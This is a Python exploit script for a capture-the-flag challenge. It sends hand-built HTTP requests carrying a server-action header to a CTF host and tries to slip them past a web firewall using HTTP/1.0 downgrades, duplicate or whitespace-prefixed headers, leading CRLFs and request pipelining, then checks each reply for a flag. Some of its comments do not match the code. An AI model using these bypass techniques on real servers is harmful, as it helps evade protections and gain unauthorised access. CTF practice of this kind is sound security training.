#!/usr/bin/env python3
"""
Try sending Next-Action header in MORE creative ways:
- Multiple HTTP/2 headers concatenated
- Headers split via chunked CONTINUATION frames
- HTTP/1 with extra preceding garbage
- HTTP/1.0 (some WAFs only inspect HTTP/1.1)
"""
import socket, ssl

HOST = "funicular-gm2cxozn.alfactf.ru"
PORT = 443
ACTION_ID = "40c6382106bb726484f31b3ebc21b7476819a1cccf"


def send(payload, label, timeout=8):
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    s = socket.create_connection((HOST, PORT), timeout=15)
    s = ctx.wrap_socket(s, server_hostname=HOST)
    s.sendall(payload)
    chunks = []
    try:
        s.settimeout(timeout)
        while True:
            d = s.recv(8192)
            if not d:
                break
            chunks.append(d)
    except (TimeoutError, socket.timeout):
        pass
    finally:
        try: s.close()
        except: pass
    full = b"".join(chunks)
    head = full[: full.find(b"\r\n\r\n")] if b"\r\n\r\n" in full else full[:300]
    body = full[full.find(b"\r\n\r\n") + 4:] if b"\r\n\r\n" in full else b""
    print(f"\n=== {label} ===")
    print(f"<full bytes={len(full)}>")
    print(full[:1500].decode("utf-8", "replace"))
    if b"alfa{" in body:
        i = body.find(b"alfa{")
        print(">>> FLAG:", body[i:i+200].decode("utf-8", "replace"))
    if b'"output":' in body:
        print("output found:", body[body.find(b'"output":'):body.find(b'"output":') + 300])
    if body and len(body) < 600:
        print("body:", body.decode("utf-8", "replace"))


# A. HTTP/1.0 (lighttpd should still serve it, WAF may not check)
body = b"[]"
req = (
    f"POST / HTTP/1.0\r\n"
    f"Host: {HOST}\r\n"
    f"Next-Action: {ACTION_ID}\r\n"
    f"Content-Type: text/plain\r\n"
    f"Accept: text/x-component\r\n"
    f"Content-Length: {len(body)}\r\n"
    f"Connection: close\r\n\r\n"
).encode() + body
send(req, "HTTP/1.0 plain")

# B. POST without Host header (lighttpd may bypass WAF for HTTP/0.9?)
req = (
    f"POST / HTTP/1.1\r\n"
    f"Host: {HOST}\r\n"
    f"Next-Action: {ACTION_ID}\r\n"
    f"Next-Action: junk\r\n"
    f"Content-Type: text/plain\r\n"
    f"Accept: text/x-component\r\n"
    f"Content-Length: {len(body)}\r\n"
    f"Connection: close\r\n\r\n"
).encode() + body
send(req, "Two Next-Action headers")

# C. Header name with leading whitespace (HTTP/1.x BAD)
req = (
    f"POST / HTTP/1.1\r\n"
    f"Host: {HOST}\r\n"
    f" Next-Action: {ACTION_ID}\r\n"
    f"Content-Type: text/plain\r\n"
    f"Accept: text/x-component\r\n"
    f"Content-Length: {len(body)}\r\n"
    f"Connection: close\r\n\r\n"
).encode() + body
send(req, "Leading space")

# D. Send whitespace BEFORE first request line (some servers tolerate it)
req = (
    f"\r\n\r\n"
    f"POST / HTTP/1.1\r\n"
    f"Host: {HOST}\r\n"
    f"Next-Action: {ACTION_ID}\r\n"
    f"Content-Type: text/plain\r\n"
    f"Content-Length: {len(body)}\r\n"
    f"Connection: close\r\n\r\n"
).encode() + body
send(req, "Leading CRLFs")

# E. Pipelined: send a benign GET first then the real POST with Next-Action
req1 = (
    f"GET / HTTP/1.1\r\n"
    f"Host: {HOST}\r\n"
    f"Connection: keep-alive\r\n\r\n"
)
req2 = (
    f"POST / HTTP/1.1\r\n"
    f"Host: {HOST}\r\n"
    f"Next-Action: {ACTION_ID}\r\n"
    f"Content-Type: text/plain\r\n"
    f"Content-Length: {len(body)}\r\n"
    f"Connection: close\r\n\r\n"
)
req = (req1 + req2).encode() + body
send(req, "Pipelined GET then POST", timeout=15)
